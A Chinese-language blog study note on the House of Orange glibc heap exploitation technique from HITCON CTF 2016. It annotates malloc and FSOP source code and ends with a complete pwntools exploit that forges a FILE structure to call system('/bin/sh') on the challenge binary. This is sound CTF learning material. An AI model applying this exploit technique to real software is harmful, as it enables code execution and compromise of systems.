---
title: how2heap 学习笔记
categories:
  - StudyNotes
tags:
  - Null
---

记录一下学习how2heap的以下东西，如果有写的不对的地方，望各位大佬轻喷…

# 0x1 House of Orange

这种利用方法是来自于 Hitcon CTF 2016 中的一道同名题目

house of orange的先决条件：

- 能够获得 libc 基址
- 能够获得 heap 基址
- 能够触发 unsorted bin attack
- 需要空间伪造 FILE 结构体

## 1. 概述

House of orange 的核心就是在没有 free 的情况下释放掉 Top Chunk 并将 Top Chunk 放入到 Unsorted bin 中，然后利用 Unsorted bin attack 改写 _IO_list_all，使 _IO_list_all 指向 main_arena 中 Unsorted bin 的位置，伪造 _IO_FILE_plus 的 vtable 完成劫持程序。

## 2. 原理

### 释放 top chunk ，并将 old_top 加入 unsorted bin

```c
# _int_malloc()
/*
	当 fastbin 以及 bin 中的所有 chunk 都不能够满足条件的时候，使用 top chunk
*/
	use_top:
      /*
         If large enough, split off the chunk bordering the end of memory
         (held in av->top). Note that this is in accord with the best-fit
         search rule.  In effect, av->top is treated as larger (and thus
         less well fitting) than any other available chunk since it can
         be extended to be as large as necessary (up to system
         limitations).
         We require that av->top always exists (i.e., has size >=
         MINSIZE) after initialization, so if it would otherwise be
         exhausted by current request, it is replenished. (The main
         reason for ensuring it exists is that we may need MINSIZE space
         to put in fenceposts in sysmalloc.)
       */
      victim = av->top;
      size = chunksize (victim);
      if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
        { 
        /*
        	当需要分配的内存小于 Top Chunk 的时候执行这里...
        */
        }
      /* When we are using atomic ops to free fast chunks we can get
         here for all block sizes.  */
      else if (have_fastchunks (av))
        {
        /*
        	如果 main_arena 中存在 fastchunks 执行这里。
        */
        }
      /*
         Otherwise, relay to handle system-dependent cases
       */
      else
        {
          /*当上面所有都不能满足的时候，并且需要分配的大小大于 top chunk 的时候执行这里。*/
          void *p = sysmalloc (nb, av);
          if (p != NULL)
            alloc_perturb (p, bytes);
          return p;
        }
    }
}
```

```c
# sysmalloc()
/*
	当不是 mmap 和 arenas 分配时执行下面
*/
  old_top = av->top;
  old_size = chunksize (old_top);
  old_end = (char *) (chunk_at_offset (old_top, old_size));
  brk = snd_brk = (char *) (MORECORE_FAILURE);
  /*
     If not the first time through, we require old_size to be
     at least MINSIZE and to have prev_inuse set.
   */
  assert ((old_top == initial_top (av) && old_size == 0) ||
          ((unsigned long) (old_size) >= MINSIZE &&
           prev_inuse (old_top) &&
           ((unsigned long) old_end & (pagesize - 1)) == 0));
  /* Precondition: not enough current space to satisfy nb request */
  assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE));
  /*
	1.old_size >= MINSIZE，即old_size不能太小
	2.old_top 设置了 prev_inuse 标志位
	3.old_end正好为页尾，即(&old_top+old_size)&(0x1000-1) == 0
	4.old_size < nb+MINSIZE，old_size不够需求
  */
  if (av != &main_arena)
    {
    /*
    	当 av != &main_arena 当前进程不是主线程，执行这里？？？
    */
    }
  else     /* av == main_arena */
    { /* Request enough space for nb + pad + overhead */
      /*
      	当前进程为主线程的时候执行这里...
       */
	  /*
		中间这里进行了一系列判断，看的云里雾里的，暂时跳过，啊哈哈哈
	  */
      if (old_size != 0)
      {
          /*
          Shrink old_top to insert fenceposts, keeping size a
          multiple of MALLOC_ALIGNMENT. We know there is at least
          enough space in old_top to do this.
           */
          old_size = (old_size - 4 * SIZE_SZ) & ~MALLOC_ALIGN_MASK;
          set_head (old_top, old_size | PREV_INUSE);
          /*
          Note that the following assignments completely overwrite
          old_top when old_size was previously MINSIZE.  This is
          intentional. We need the fencepost, even if old_top otherwise gets
          lost.
           */
          chunk_at_offset (old_top, old_size)->size =
              (2 * SIZE_SZ) | PREV_INUSE;
          chunk_at_offset (old_top, old_size + 2 * SIZE_SZ)->size =
              (2 * SIZE_SZ) | PREV_INUSE;
          /* If possible, release the rest. */
          if (old_size >= MINSIZE)
          {
              /*这里将 old_top 进行free*/
              _int_free (av, old_top, 1);
          }
       }
    }
/*
	下面进行了一系列处理，最后返回分配内存
*/
```



### 利用 unsorted bin attack 更改 _IO_list_all

中间细节不表，以后更新在 unsorted bin attack 里面



### 利用 FSOP 劫持程序

下面先给一张 FSOP (File Stream Oriented Programming) 攻击方式的示意图

![abort_routine.001](/image/2019-02-02-how2heap_study_note/abort_routine.001.jpeg)

通过触发 abort 中的 fflush 再触发 _IO_flush_all_lockp。

常见触发方式有以下几种:

- 当 libc 执行 abort 流程时
- 当执行 exit 函数时
- 当执行流从 main 函数返回时

这里我们不讨论怎样触发 malloc_printerr ，而是直接看最后的时候 FILE 指针需要怎么部署。

```c
int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  struct _IO_FILE *fp;
  int last_stamp;
#ifdef _IO_MTSAFE_IO
  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
  if (do_lock)
    _IO_lock_lock (list_all_lock);
#endif
  last_stamp = _IO_list_all_stamp;
  /*
  	上面的东西先暂时不管...
  */
  fp = (_IO_FILE *) _IO_list_all;
  /*
  	这里直接将 _IO_list_all 的值赋给 fp
  */
  while (fp != NULL)
    {
      /*
      当 fp 为空的时候退出，其实指的是上一个 fp->_chain 为空的时候。
      */
      run_fp = fp;
      if (do_lock)
	_IO_flockfile (fp);
      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
#endif
	   )
          /*
          可以看到这上面的这个if，就是对这个 FILE 指针的要求了...
          */
	  && _IO_OVERFLOW (fp, EOF) == EOF)
	result = EOF;
      if (do_lock)
	_IO_funlockfile (fp);
      run_fp = NULL;
      if (last_stamp != _IO_list_all_stamp)
	{
	  /* Something was added to the list.  Start all over again.  */
	  fp = (_IO_FILE *) _IO_list_all;
	  last_stamp = _IO_list_all_stamp;
	}
      else
	fp = fp->_chain;
    }
/*
下面的代码暂时不管...
*/
}
```

可以从上面的代码中看见，如果想要执行 _IO_OVERFLOW ，则需要通过下面其中一种条件了。

```
1.(fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)

2.(_IO_vtable_offset (fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base)
```



## 3. house of orange writeup

例行检查一下程序，保护全开。

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

### 程序流程

一共有三个选项：build、see、upgrade。

整个程序一共涉及到两个结构体

```c
struct {
	struct price_and_color;
	char *name;
} house_ptr;


struct {
	unsigned int price;
	unsigned int color;
} price_and_color;
```

build 函数，一个可以执行四次，功能主要是创建一个house放在 .bss 段上面，并使用 malloc 创建一个可控大小（小于等于0x1000）的内存空间作为 name，其中每次 build 都会覆盖 .bss 上面的指针，每次 see 和 upgrade 就只能操作当前的 house。

see 函数可以将 name、price、color全部打印出来。

upgrade 函数可一个修改可控大小（小于0x1000）的 内存空间name，由于并没有记录name的大小，所以当upgrade 改写的 0x1000 > changed_name > old_name 的时候会存在 overflow_chunk。

------

### 释放 top_chunk

如何将 top_chunk 释放到 unsorted bin：

1.build创建一个house，name的大小为0x10

2.upgrade改写name覆盖top chunk size （大小为 top_size & 0xfff）

3.build创建一个house，name的大小大于top_chunk_size(将当前top_chunk放入unsorted bin)



### 泄露 libc_addr and heap_addr

这里怎么泄露 heap_addr 呢？我们在 _int_malloc 中找一下

```c
  for (;; )
    {
      int iters = 0;
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
          bck = victim->bk;
          if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
              || __builtin_expect (victim->size > av->system_mem, 0))
            malloc_printerr (check_action, "malloc(): memory corruption",
                             chunk2mem (victim), av);
          size = chunksize (victim);

        /*
            中间的代码，在这里不重要
        */

          if (in_smallbin_range (size))
            {
            /*
                当请求分配的大小为in_smallbin_range的时候进入这里
            */
            }
          else
            {
            /*
                当请求分配的大小为large_bin的时候进入这里
            */
              victim_index = largebin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;

              /* maintain large bins in sorted order */
              if (fwd != bck)
                {
                  /*
                  当前large_bin链表中存在其他元素的时候进来，这里我们不考虑...
                  */
                    }
                }
              else
                /*
                  在这里我们在chunk->fd_nextsize这里得到当前chunk的地址
                */
                victim->fd_nextsize = victim->bk_nextsize = victim;
            }
		/*在这里放入large_bin中*/
          mark_bin (av, victim_index);
          victim->bk = bck;
          victim->fd = fwd;
          fwd->bk = victim;
          bck->fd = victim;

#define MAX_ITERS       10000
          if (++iters >= MAX_ITERS)
            break;
        }
		/*
		后面是分配large_bin具体的代码了，不深究了。
		*/
        }
```

到这里，怎么泄露heap和libc的地址就很清楚了

1.build 创建一个house，name的大小为unsorted_chunk_size - 0x60（下面会讲到为什么是0x60）

2.see house 泄露出libc_addr

3.由于heap的地址和libc的地址隔了两个‘\x00’，所以再使用 upgrade 覆盖掉两个\x00

4.see house 泄露出heap_addr

### 伪造 FILE 指针

现在我们有了heap的地址，libc的基地址，所以我们可以在在栈中伪造 FILE 指针了，由于我们之后要用到unsorted bin attack，但是我们不能在 main_arena 的内存空间伪造 vtable 比较麻烦，由于 unsorted_bin 在本题条件中，只能触发一次，所以我们选择将 ((struct _IO_FILE *)&main_arena+88)->\_chain 指向到我们可控的heap空间中。

通过print &((struct \_IO_FILE *) 0)->_chain 可以在gdb中找到这个相对偏移为0x68。

```c
+0x00 [       top        |  last_remainder   ]
+0x10 [ unsorted bin fd  |  unsorted bin bk  ]
+0x20 [ smallbin 0x20 fd | smallbin 0x20 bk  ]
+0x30 [ smallbin 0x30 fd | smallbin 0x30 bk  ]
+0x40 [ smallbin 0x40 fd | smallbin 0x40 bk  ]
+0x50 [ smallbin 0x50 fd | smallbin 0x50 bk  ]
+0x60 [ smallbin 0x60 fd | smallbin 0x60 bk  ] /* 0x68 */
```

((struct _IO_FILE *)&main_arena+88)->\_chain 指向的是正好就是bin[4]，small bin[4]，所以前面的0x60刚好可以用上。

![house_of_orange](/image/2019-02-02-how2heap_study_note/house_of_orange.png)

具体步骤:

1.伪造FILE指针（使fp->\_mode <= 0 && fp->\_IO_write_ptr > fp->\_IO_write_base成立）

2.将 \_IO_list_all - 0x10 的值写入unsorted_bin

3.由于我们已经知道heap的地址，计算FILE指针底部到泄露heap地址的偏移量，将FILE指针底部地址写入vtable

4.伪造 vtable

### 利用FSOP劫持程序

由于前面我们在内存空间部署好了，接下来就可以劫持程序流程了

1.build house（在第一个malloc的时候，由于触发了unsorted bin attack，所以会触发malloc_error）

```c
if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
    || __builtin_expect (victim->size > av->system_mem, 0))
    malloc_printerr (check_action, "malloc(): memory corruption",
                     chunk2mem (victim), av);
```



exp：

```python
# -*- coding: utf-8 -*-
# !/usr/bin/python env
from pwn import *


def build_the_house(exp_file, name_len, name, price, color):
    exp_file.recvuntil("Your choice :")
    exp_file.sendline(str(1))
    exp_file.recvuntil("Length of name :")
    exp_file.sendline(str(name_len))
    exp_file.recvuntil("Name :")
    exp_file.sendline(name)
    exp_file.recvuntil("Price of Orange:")
    exp_file.sendline(str(price))
    exp_file.recvuntil("Color of Orange:")
    exp_file.sendline(str(color))


def see_the_house(exp_file):
    exp_file.recvuntil("Your choice :")
    exp_file.sendline(str(2))


def upgrade_the_house(exp_file, name_len, name, price, color):
    exp_file.recvuntil("Your choice :")
    exp_file.sendline(str(3))
    exp_file.recvuntil("Length of name :")
    exp_file.sendline(str(name_len))
    exp_file.recvuntil("Name:")
    exp_file.send(name)
    exp_file.recvuntil("Price of Orange:")
    exp_file.sendline(str(price))
    exp_file.recvuntil("Color of Orange:")
    exp_file.sendline(str(color))


def main():
    debug = 1
    if debug:
        exp_file = process("/home/who/Desktop/how2heap/houseoforange")
        elf_file = ELF("/home/who/Desktop/how2heap/houseoforange")
        libc_file = ELF("/home/who/Desktop/libc_l64.so.6")
        main_arena_offset = 0x3C4B20
        # context.log_level = "debug"

    build_the_house(exp_file, 0x10, "a"*0xf, 30, 1)
    payload_1 = "b" * 0x10
    payload_1 += p64(0x0) + p64(0x21)
    payload_1 += p64(0x0000001f0000001e) + p64(0x0)
    payload_1 += p64(0x0) + p64(0xfa1)
    upgrade_the_house(exp_file, 0x40, payload_1, 30, 2)
    build_the_house(exp_file, 0x1000, payload_1, 30, 3)

    # leak heap_addr and leak main_arena
    build_the_house(exp_file, 0xe90, "a"*0x7, 30, 4)
    see_the_house(exp_file)
    recv_value = exp_file.recvuntil("Price of orange :").split("a"*0x7)[1][1:7]
    main_arena_addr = u64(recv_value + "\x00"*2) - 1640
    libc_addr = main_arena_addr - main_arena_offset
    _IO_list_all_addr = libc_addr + libc_file.symbols['_IO_list_all']
    system_addr = libc_addr + libc_file.symbols['system']
    log.info("main_arena_addr:{addr}".format(addr=hex(main_arena_addr)))
    log.info("libc_addr:{addr}".format(addr=hex(libc_addr)))
    log.info("_IO_list_all_addr:{addr}".format(addr=hex(_IO_list_all_addr)))
    log.info("system_addr:{addr}".format(addr=hex(system_addr)))
    upgrade_the_house(exp_file, 0x10, "a"*0x10, 30, 2)
    see_the_house(exp_file)
    recv_value = exp_file.recvuntil("Price of orange :").split("a" * 0x10)[1][0:6]
    heap_addr = u64(recv_value + "\x00" * 2)
    log.info("heap_addr:{addr}".format(addr=hex(heap_addr)))

    payload_2 = "b" * 0xeb0

    fake_file = '/bin/sh\x00'+p64(0x61)
    #'/bin/sh\x00' ; to smallbin 0x60 (_chain)
    fake_file += p64(main_arena_addr + 88) + p64(_IO_list_all_addr - 0x10) 				#unsortedbin attack
    fake_file += p64(0)+p64(1) 
    #_IO_write_base ; _IO_write_ptr
    fake_file = fake_file.ljust(0xc0,'\x00')
    fake_file += p64(0) 
    #mode<=0
    fake_file += p64(0x0) *2
    fake_file += p64(heap_addr + 0xfa0)
    fake_file += p64(0x0) * 3
    fake_file += p64(system_addr) * 1
    payload_2 += fake_file
    upgrade_the_house(exp_file, 0xfff, payload_2, 30, 2)

    exp_file.sendline(str(1))
    # attach(exp_file)
    exp_file.interactive()


if __name__ == '__main__':
    main()
```



# 0x2 未完待续…

未完待续…



# 0x3 Reference

- [http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html](http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html)
- [https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/](https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/)
- [https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more](https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more)



